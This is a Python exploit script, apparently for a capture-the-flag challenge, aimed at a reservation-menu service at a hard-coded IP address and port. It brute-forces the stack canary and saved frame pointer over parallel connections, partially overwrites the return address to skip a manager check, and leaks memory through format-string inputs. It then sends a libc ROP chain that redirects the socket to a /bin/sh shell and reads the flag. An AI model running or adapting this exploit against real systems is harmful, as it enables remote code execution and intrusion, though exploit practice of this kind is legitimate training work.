#!/usr/bin/env python3
import socket
import struct
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST = "154.57.164.82"
PORT = 32327


class Conn:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=5)
        self.buf = b""

    def recvuntil(self, marker):
        while marker not in self.buf:
            chunk = self.s.recv(4096)
            if not chunk:
                break
            self.buf += chunk
        if marker in self.buf:
            end = self.buf.index(marker) + len(marker)
            out, self.buf = self.buf[:end], self.buf[end:]
            return out
        out, self.buf = self.buf, b""
        return out

    def send(self, data):
        self.s.sendall(data)

    def close(self):
        self.s.close()


MENU = b"+--------------------+\n| 1) Reserve a table |"


def login(c):
    c.recvuntil(b"=> ")
    c.send(b"x\n")
    c.recvuntil(b"=> ")


def clear():
    c = Conn(); login(c)
    c.send(b"6\n")
    out = c.recvuntil(b"=> ")
    c.close()
    return out


def reserve(fmt):
    assert len(fmt) <= 4
    c = Conn(); login(c)
    c.send(b"1\n")
    c.recvuntil(b"=> ")
    c.send(fmt)  # exactly four bytes avoids a trailing newline in the menu input
    out = c.recvuntil(b"=> ")
    c.close()
    return out


def view():
    c = Conn(); login(c)
    c.send(b"5\n")
    out = c.recvuntil(b"=> ")
    c.close()
    return out


def overflow(tail, want=MENU):
    """Reach the order overflow. Return output and whether `want` appeared."""
    c = None
    try:
        c = Conn(); login(c)
        c.send(b"1\n")
        c.recvuntil(b"=> ")
        c.send(b"1\n")
        c.recvuntil(b"=> ")
        c.send(b"2\n")
        c.recvuntil(b"=> ")
        c.send(b"A" * 0x100)
        c.recvuntil(b"=> ")
        c.send(b"y\n")
        c.recvuntil(b"=> ")
        c.send(tail)
        out = c.recvuntil(want)
        return out, want in out
    except (OSError, TimeoutError):
        return b"", False
    finally:
        if c:
            c.close()


def brute_canary(workers=24):
    known = b"\x00"
    for pos in range(1, 8):
        found = None
        for start in range(0, 256, workers):
            guesses = range(start, min(start + workers, 256))
            with ThreadPoolExecutor(max_workers=workers) as pool:
                jobs = {pool.submit(overflow, b"B" * 8 + known + bytes([g])): g
                        for g in guesses}
                for job in as_completed(jobs):
                    _, ok = job.result()
                    if ok:
                        found = jobs[job]
            if found is not None:
                break
        if found is None:
            raise RuntimeError(f"failed to find canary byte {pos}")
        known += bytes([found])
        print(f"canary[{pos}] = {found:02x}; known={known.hex()}", flush=True)
    return known


def brute_saved_rbp(canary, workers=24):
    known = b""
    for pos in range(6):  # canonical user-space stack pointers end in two zero bytes
        found = None
        for start in range(0, 256, workers):
            guesses = range(start, min(start + workers, 256))
            with ThreadPoolExecutor(max_workers=workers) as pool:
                jobs = {pool.submit(overflow, b"B" * 8 + canary + known + bytes([g])): g
                        for g in guesses}
                for job in as_completed(jobs):
                    _, ok = job.result()
                    if ok:
                        found = jobs[job]
            if found is not None:
                break
        if found is None:
            raise RuntimeError(f"failed to find saved-rbp byte {pos}")
        known += bytes([found])
        print(f"rbp[{pos}] = {found:02x}; known={known.hex()}", flush=True)
    return known + b"\x00\x00"


def bypass_view(canary, saved_rbp):
    # The original return is PIE+0x1957.  Partially replace its low two bytes
    # with PIE+0x1426, the first instruction after the manager check.
    for high in range(16):
        low16 = 0x0426 + (high << 12)
        tail = b"B" * 8 + canary + saved_rbp + low16.to_bytes(2, "little")
        out, ok = overflow(tail, want=b"Table for")
        print(f"trying return low16={low16:04x}: {ok}", flush=True)
        if ok:
            # Repeat once and collect through the expected post-view crash.
            full, _ = overflow(tail, want=b"__never_sent_by_server__")
            print(full.decode("latin1", "replace"))
            return low16, full
    raise RuntimeError("PIE nibble not found")


def jump_partial(canary, saved_rbp, low16, want):
    tail = b"B" * 8 + canary + saved_rbp + low16.to_bytes(2, "little")
    return overflow(tail, want=want)


def leak_string(canary, saved_rbp, index):
    out, ok = jump_partial(canary, saved_rbp, 0x1847, b"Cleared reservations.")
    print("clear bypass:", ok, out.decode("latin1", "replace"))
    print("format attempt:", reserve(f"%{index}$s".encode()).decode("latin1", "replace"))
    out, _ = jump_partial(canary, saved_rbp, 0x1426, b"__never_sent_by_server__")
    print("raw leak:", out)


def p64(x):
    return struct.pack("<Q", x)


def get_shell(canary, saved_rbp, libc_base):
    ret = libc_base + 0x29139
    pop_rdi = libc_base + 0x2A3E5
    pop_rsi = libc_base + 0x2BE51
    dup2 = libc_base + 0x115010
    system = libc_base + 0x50D70
    bin_sh = libc_base + 0x1D8678

    chain = []
    for dst in (0, 1, 2):
        # A ret before each real call preserves SysV stack alignment.
        chain += [ret, pop_rdi, 4, pop_rsi, dst, dup2]
    chain += [ret, pop_rdi, bin_sh, system]
    tail = b"B" * 8 + canary + saved_rbp + b"".join(map(p64, chain))
    assert len(tail) <= 0x100

    c = Conn(); login(c)
    c.send(b"1\n"); c.recvuntil(b"=> "); c.send(b"1\n"); c.recvuntil(b"=> ")
    c.send(b"2\n"); c.recvuntil(b"=> "); c.send(b"A" * 0x100); c.recvuntil(b"=> ")
    c.send(b"y\n"); c.recvuntil(b"=> "); c.send(tail)
    banner = c.recvuntil(b"placed!\n")
    c.send(b"cat flag* 2>/dev/null; exit\n")
    c.s.settimeout(3)
    out = c.buf
    c.buf = b""
    try:
        while True:
            chunk = c.s.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    c.close()
    print((banner + out).decode("latin1", "replace"))
    return banner + out


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "brute":
        print("canary:", brute_canary().hex())
    elif len(sys.argv) > 1 and sys.argv[1] == "view":
        bypass_view(bytes.fromhex(sys.argv[2]), bytes.fromhex(sys.argv[3]))
    elif len(sys.argv) > 1 and sys.argv[1] == "rbp":
        print("saved rbp:", brute_saved_rbp(bytes.fromhex(sys.argv[2])).hex())
    elif len(sys.argv) > 1 and sys.argv[1] == "leakstr":
        leak_string(bytes.fromhex(sys.argv[2]), bytes.fromhex(sys.argv[3]), int(sys.argv[4]))
    elif len(sys.argv) > 1 and sys.argv[1] == "shell":
        get_shell(bytes.fromhex(sys.argv[2]), bytes.fromhex(sys.argv[3]), int(sys.argv[4], 0))
    else:
        print(clear().decode("latin1", "replace"))
        for i in range(1, 10):
            f = f"%{i}$p".encode()
            print(i, reserve(f).decode("latin1", "replace"))
        print(view().decode("latin1", "replace"))
